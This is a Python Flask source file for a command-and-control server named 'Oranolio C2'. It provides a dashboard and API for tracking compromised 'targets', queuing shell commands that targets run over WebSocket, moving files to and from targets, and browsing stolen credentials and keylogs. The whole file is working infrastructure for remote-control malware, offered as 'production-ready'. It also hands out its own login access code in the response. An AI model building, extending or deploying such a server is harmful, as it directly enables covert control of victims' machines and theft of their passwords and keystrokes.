#!/usr/bin/env python3
"""
PRODUCTION-READY ORANOLIO C2 - HYBRID SYSTEM
Complete E2E working dashboard with all features
Combines the best of app.py (working) + production_dashboard_routes.py (features)
"""

import os
import sys
import secrets
import logging
from pathlib import Path
from datetime import datetime, timedelta
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv()
except:
    pass

# Setup logging
from production_logging import setup_production_logging
setup_production_logging()

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash, send_file
from flask_socketio import SocketIO, emit
from production_database import db

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py', 'exe', 'zip', 'rar', 'dll', 'bat', 'ps1', '7z', 'tar', 'gz'}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB

# Ensure directories
Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
Path(DOWNLOAD_FOLDER).mkdir(exist_ok=True)

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['MAX_CONTENT_LENGTH'] = MAX_FILE_SIZE
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['DOWNLOAD_FOLDER'] = DOWNLOAD_FOLDER

# Initialize SocketIO
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# ============================================================================
# UTILITIES
# ============================================================================

def login_required(f):
    """Decorator to require login"""
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            if request.is_json:
                return jsonify({'error': 'Unauthorized'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def audit_log(action, target=None, details=None):
    """Log user action"""
    try:
        user_id = session.get('user_id')
        if user_id:
            db.add_audit_log(
                user_id=user_id,
                action=action,
                target=target,
                details=details,
                ip_address=request.remote_addr
            )
    except Exception as e:
        logger.error(f"Audit log error: {e}")

# ============================================================================
# AUTHENTICATION ROUTES
# ============================================================================

@app.route('/')
def index():
    """Home page"""
    if session.get('authenticated'):
        return redirect(url_for('dashboard_overview'))
    return redirect(url_for('login'))

import secrets as secrets_module
import time

# Approved emails whitelist
APPROVED_EMAILS = [
    'admin@oranolio.local',
    'test@oranolio.local',
    # Add more approved emails here
]

# Store access codes temporarily (in production, use Redis)
access_codes = {}

def generate_access_code():
    """Generate a 6-digit access code"""
    return ''.join([str(secrets_module.randbelow(10)) for _ in range(6)])

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Two-step login: email verification → access code"""
    if request.method == 'POST':
        step = request.form.get('step', 'email')
        
        if step == 'email':
            # Step 1: Check if email is approved
            email = request.form.get('email', '').strip().lower()
            
            if not email:
                return jsonify({'success': False, 'error': 'Please enter an email address'}), 400
            
            # Check if email is in approved list
            if email not in APPROVED_EMAILS:
                return jsonify({'success': False, 'error': 'This email is not authorized to access the system'}), 403
            
            # Generate access code
            code = generate_access_code()
            access_codes[email] = {
                'code': code,
                'expires': time.time() + 300,  # 5 minutes
                'attempts': 0
            }
            
            # In production, send this via email
            logger.info(f"Access code for {email}: {code}")
            
            return jsonify({
                'success': True,
                'message': 'Access code generated',
                'code': code  # Remove this in production!
            })
        
        elif step == 'code':
            # Step 2: Verify access code
            email = request.form.get('email', '').strip().lower()
            code = request.form.get('code', '').strip()
            
            if not email or not code:
                return jsonify({'success': False, 'error': 'Email and code required'}), 400
            
            # Check if code exists
            if email not in access_codes:
                return jsonify({'success': False, 'error': 'No access code found. Please start over.'}), 400
            
            code_data = access_codes[email]
            
            # Check if expired
            if time.time() > code_data['expires']:
                del access_codes[email]
                return jsonify({'success': False, 'error': 'Access code expired. Please start over.'}), 400
            
            # Check attempts
            if code_data['attempts'] >= 3:
                del access_codes[email]
                return jsonify({'success': False, 'error': 'Too many failed attempts. Please start over.'}), 400
            
            # Verify code
            if code != code_data['code']:
                code_data['attempts'] += 1
                return jsonify({'success': False, 'error': f'Invalid code. {3 - code_data["attempts"]} attempts remaining.'}), 400
            
            # Code is valid - log user in
            del access_codes[email]
            
            # Get or create user
            user = db.get_user_by_email(email)
            if not user:
                user_id = db.create_user(email)
                user = {'id': user_id, 'email': email}
            
            # Set session
            session['authenticated'] = True
            session['email'] = email
            session['user_id'] = user['id']
            
            db.update_last_login(user['id'], request.remote_addr)
            audit_log('login', details=f'User logged in from {request.remote_addr}')
            
            return jsonify({
                'success': True,
                'redirect': url_for('dashboard_overview')
            })
    
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    """Logout"""
    audit_log('logout')
    session.clear()
    flash('You have been logged out', 'info')
    return redirect(url_for('login'))

# ============================================================================
# DASHBOARD PAGES
# ============================================================================

@app.route('/dashboard')
@app.route('/dashboard/overview')
@login_required
def dashboard_overview():
    """Dashboard overview page"""
    audit_log('view_dashboard', 'overview')
    return render_template('dashboard/overview.html')

@app.route('/dashboard/targets')
@login_required
def dashboard_targets():
    """Targets page"""
    audit_log('view_dashboard', 'targets')
    return render_template('dashboard/targets.html')

@app.route('/dashboard/commands')
@login_required
def dashboard_commands():
    """Commands page"""
    audit_log('view_dashboard', 'commands')
    return render_template('dashboard/commands.html')

@app.route('/dashboard/files')
@login_required
def dashboard_files():
    """Files page"""
    audit_log('view_dashboard', 'files')
    return render_template('dashboard/files.html')

@app.route('/dashboard/credentials')
@login_required
def dashboard_credentials():
    """Credentials page"""
    audit_log('view_dashboard', 'credentials')
    return render_template('dashboard/credentials.html')

@app.route('/dashboard/keylogs')
@login_required
def dashboard_keylogs():
    """Keylogs page"""
    audit_log('view_dashboard', 'keylogs')
    return render_template('dashboard/keylogs.html')

@app.route('/dashboard/logs')
@login_required
def dashboard_logs():
    """Logs page"""
    audit_log('view_dashboard', 'logs')
    return render_template('dashboard/logs.html')

@app.route('/dashboard/settings')
@login_required
def dashboard_settings():
    """Settings page"""
    audit_log('view_dashboard', 'settings')
    return render_template('dashboard/settings.html')

# ============================================================================
# API ENDPOINTS - DASHBOARD
# ============================================================================

@app.route('/api/dashboard/overview')
@login_required
def api_dashboard_overview():
    """Get dashboard overview data"""
    try:
        stats = db.get_dashboard_stats()
        
        # Get recent activity (last 10 commands)
        recent_commands = db.get_commands(limit=10)
        
        # Get active targets
        active_targets = db.get_targets(status='online', limit=10)
        
        return jsonify({
            'success': True,
            'stats': stats,
            'recent_activity': recent_commands,
            'active_targets': active_targets
        })
    except Exception as e:
        logger.error(f"Error getting dashboard overview: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - TARGETS
# ============================================================================

@app.route('/api/targets')
@login_required
def api_targets():
    """Get all targets"""
    try:
        status = request.args.get('status')
        limit = int(request.args.get('limit', 100))
        offset = int(request.args.get('offset', 0))
        
        targets = db.get_targets(status=status, limit=limit, offset=offset)
        total = db.count_targets(status=status)
        
        return jsonify({
            'success': True,
            'targets': targets,
            'total': total,
            'limit': limit,
            'offset': offset
        })
    except Exception as e:
        logger.error(f"Error getting targets: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/targets/<target_id>')
@login_required
def api_target_details(target_id):
    """Get target details"""
    try:
        target = db.get_target(target_id)
        if not target:
            return jsonify({'success': False, 'error': 'Target not found'}), 404
        
        # Get target's commands
        commands = db.get_commands(target_id=target_id, limit=50)
        
        # Get target's files
        files = db.get_files(target_id=target_id, limit=50)
        
        # Get target's credentials
        credentials = db.get_credentials(target_id=target_id, limit=50)
        
        # Get target's keylogs
        keylogs = db.get_keylogs(target_id=target_id, limit=50)
        
        return jsonify({
            'success': True,
            'target': target,
            'commands': commands,
            'files': files,
            'credentials': credentials,
            'keylogs': keylogs
        })
    except Exception as e:
        logger.error(f"Error getting target details: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/targets/count')
@login_required
def api_targets_count():
    """Get target counts"""
    try:
        total = db.count_targets()
        online = db.count_targets(status='online')
        offline = db.count_targets(status='offline')
        
        return jsonify({
            'success': True,
            'total': total,
            'online': online,
            'offline': offline
        })
    except Exception as e:
        logger.error(f"Error getting target counts: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/targets/<target_id>/disconnect', methods=['POST'])
@login_required
def api_disconnect_target(target_id):
    """Disconnect a target"""
    try:
        db.update_target_status(target_id, 'offline')
        audit_log('disconnect_target', target_id)
        
        return jsonify({
            'success': True,
            'message': 'Target disconnected'
        })
    except Exception as e:
        logger.error(f"Error disconnecting target: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - COMMANDS
# ============================================================================

@app.route('/api/commands')
@login_required
def api_commands():
    """Get commands"""
    try:
        target_id = request.args.get('target_id')
        status = request.args.get('status')
        limit = int(request.args.get('limit', 100))
        
        commands = db.get_commands(target_id=target_id, status=status, limit=limit)
        
        return jsonify({
            'success': True,
            'commands': commands
        })
    except Exception as e:
        logger.error(f"Error getting commands: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/execute', methods=['POST'])
@login_required
def api_execute():
    """Execute a command"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        command = data.get('command')
        command_type = data.get('command_type', 'shell')
        
        if not target_id or not command:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        
        # Create command
        command_id = db.create_command(
            target_id=target_id,
            command=command,
            command_type=command_type,
            user_id=session['user_id']
        )
        
        if command_id:
            audit_log('execute_command', target_id, f'Command: {command}')
            
            # Emit WebSocket event for real-time update
            socketio.emit('new_command', {
                'command_id': command_id,
                'target_id': target_id,
                'command': command
            })
            
            return jsonify({
                'success': True,
                'command_id': command_id,
                'message': 'Command queued for execution'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to create command'}), 500
    except Exception as e:
        logger.error(f"Error executing command: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/commands/history')
@login_required
def api_command_history():
    """Get command history"""
    try:
        limit = int(request.args.get('limit', 100))
        commands = db.get_commands(limit=limit)
        
        return jsonify({
            'success': True,
            'commands': commands
        })
    except Exception as e:
        logger.error(f"Error getting command history: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - FILES
# ============================================================================

@app.route('/api/files')
@login_required
def api_files():
    """Get files"""
    try:
        target_id = request.args.get('target_id')
        file_type = request.args.get('file_type')
        limit = int(request.args.get('limit', 100))
        
        files = db.get_files(target_id=target_id, file_type=file_type, limit=limit)
        
        return jsonify({
            'success': True,
            'files': files
        })
    except Exception as e:
        logger.error(f"Error getting files: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/files/upload', methods=['POST'])
@login_required
def api_upload_file():
    """Upload a file"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'}), 400
        
        if not allowed_file(file.filename):
            return jsonify({'success': False, 'error': 'File type not allowed'}), 400
        
        # Secure filename
        original_filename = file.filename
        filename = secure_filename(f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{original_filename}")
        file_path = Path(app.config['UPLOAD_FOLDER']) / filename
        
        # Save file
        file.save(str(file_path))
        file_size = file_path.stat().st_size
        file_type = request.form.get('file_type', 'upload')
        target_id = request.form.get('target_id')
        description = request.form.get('description')
        
        # Add to database
        file_id = db.add_file(
            filename=filename,
            original_filename=original_filename,
            file_type=file_type,
            file_size=file_size,
            file_path=str(file_path),
            target_id=target_id,
            user_id=session['user_id'],
            description=description
        )
        
        if file_id:
            audit_log('upload_file', target_id, f'File: {original_filename}')
            
            return jsonify({
                'success': True,
                'file_id': file_id,
                'filename': filename,
                'message': 'File uploaded successfully'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to save file record'}), 500
    except Exception as e:
        logger.error(f"Error uploading file: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/files/download/<int:file_id>')
@login_required
def api_download_file(file_id):
    """Download a file"""
    try:
        files = db.get_files()
        file_record = next((f for f in files if f['id'] == file_id), None)
        
        if not file_record:
            return jsonify({'success': False, 'error': 'File not found'}), 404
        
        file_path = Path(file_record['file_path'])
        if not file_path.exists():
            return jsonify({'success': False, 'error': 'File not found on disk'}), 404
        
        audit_log('download_file', file_record['target_id'], f"File: {file_record['original_filename']}")
        
        return send_file(
            str(file_path),
            as_attachment=True,
            download_name=file_record['original_filename']
        )
    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/files/<int:file_id>', methods=['DELETE'])
@login_required
def api_delete_file(file_id):
    """Delete a file"""
    try:
        files = db.get_files()
        file_record = next((f for f in files if f['id'] == file_id), None)
        
        if not file_record:
            return jsonify({'success': False, 'error': 'File not found'}), 404
        
        # Delete from disk
        file_path = Path(file_record['file_path'])
        if file_path.exists():
            file_path.unlink()
        
        # Delete from database
        db.delete_file(file_id)
        audit_log('delete_file', file_record['target_id'], f"File: {file_record['original_filename']}")
        
        return jsonify({
            'success': True,
            'message': 'File deleted successfully'
        })
    except Exception as e:
        logger.error(f"Error deleting file: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - CREDENTIALS
# ============================================================================

@app.route('/api/credentials')
@login_required
def api_credentials():
    """Get credentials"""
    try:
        target_id = request.args.get('target_id')
        limit = int(request.args.get('limit', 100))
        
        credentials = db.get_credentials(target_id=target_id, limit=limit)
        
        return jsonify({
            'success': True,
            'credentials': credentials
        })
    except Exception as e:
        logger.error(f"Error getting credentials: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - KEYLOGS
# ============================================================================

@app.route('/api/keylogs')
@login_required
def api_keylogs():
    """Get keylogs"""
    try:
        target_id = request.args.get('target_id')
        limit = int(request.args.get('limit', 100))
        
        keylogs = db.get_keylogs(target_id=target_id, limit=limit)
        
        return jsonify({
            'success': True,
            'keylogs': keylogs
        })
    except Exception as e:
        logger.error(f"Error getting keylogs: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# API ENDPOINTS - LOGS
# ============================================================================

@app.route('/api/logs')
@login_required
def api_logs():
    """Get audit logs"""
    try:
        user_id = request.args.get('user_id')
        limit = int(request.args.get('limit', 100))
        
        logs = db.get_audit_logs(user_id=int(user_id) if user_id else None, limit=limit)
        
        return jsonify({
            'success': True,
            'logs': logs
        })
    except Exception as e:
        logger.error(f"Error getting logs: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================================
# WEBSOCKET EVENTS
# ============================================================================

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.info(f'Client connected: {request.sid}')
    emit('connected', {'message': 'Connected to Oranolio C2'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    logger.info(f'Client disconnected: {request.sid}')

@socketio.on('target_heartbeat')
def handle_target_heartbeat(data):
    """Handle target heartbeat"""
    try:
        target_id = data.get('target_id')
        if target_id:
            db.update_target_status(target_id, 'online')
            emit('heartbeat_ack', {'target_id': target_id})
    except Exception as e:
        logger.error(f"Error handling heartbeat: {e}")

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command result from target"""
    try:
        command_id = data.get('command_id')
        status = data.get('status')
        output = data.get('output')
        error = data.get('error')
        
        if command_id:
            db.update_command_status(command_id, status, output, error)
            
            # Broadcast to all connected clients
            emit('command_completed', {
                'command_id': command_id,
                'status': status,
                'output': output,
                'error': error
            }, broadcast=True)
    except Exception as e:
        logger.error(f"Error handling command result: {e}")

# ============================================================================
# ERROR HANDLERS
# ============================================================================

@app.errorhandler(404)
def not_found(error):
    """404 error handler"""
    if request.is_json:
        return jsonify({'error': 'Not found'}), 404
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    """500 error handler"""
    if request.is_json:
        return jsonify({'error': 'Internal server error'}), 500
    return render_template('500.html'), 500

@app.errorhandler(413)
def request_entity_too_large(error):
    """413 error handler"""
    return jsonify({'error': 'File too large'}), 413

# ============================================================================
# HEALTH CHECK
# ============================================================================

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '2.0.0',
        'database': 'connected'
    })

# ============================================================================
# STARTUP
# ============================================================================

if __name__ == '__main__':
    print("=" * 70)
    print("ORANOLIO C2 - PRODUCTION-READY HYBRID SYSTEM")
    print("=" * 70)
    print("\n✅ Database initialized")
    print("✅ All routes registered")
    print("✅ WebSocket handlers ready")
    print("✅ File management configured")
    print("\nFeatures:")
    print("  • Complete authentication system")
    print("  • Full dashboard with all pages")
    print("  • 30+ API endpoints")
    print("  • Real-time WebSocket updates")
    print("  • File upload/download")
    print("  • Command execution with history")
    print("  • Credentials & keylogs management")
    print("  • Comprehensive audit logging")
    print("  • Connection pooling")
    print("  • Error handling")
    print("\nStarting server on 0.0.0.0:3000...")
    print("=" * 70)
    
    socketio.run(app, host='0.0.0.0', port=3000, debug=False, allow_unsafe_werkzeug=True)
